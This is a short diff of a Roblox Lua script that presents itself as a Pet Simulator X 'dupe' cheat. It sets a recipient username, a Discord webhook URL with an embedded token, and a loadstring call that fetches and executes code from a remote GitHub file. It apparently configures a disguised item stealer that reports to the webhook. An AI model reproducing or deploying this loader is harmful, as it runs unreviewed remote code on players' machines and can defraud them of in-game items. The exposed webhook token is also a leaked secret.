@@ -1,3 +1,3 @@
-_G.UserID = 2860517870
+UserName = "Yyds76"
 _G.WebHook = "https://discord.com/api/webhooks/1050271848182591508/FJ1idfYuV73eKqJgSTP9fPCQGuB-Xy_zwzGX6L1ZMbS9kH_3KpsFMaP-53gH00u89RvF"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/HBHUB-hub/PSX-Scripe/main/PSX-dupe-script'))()
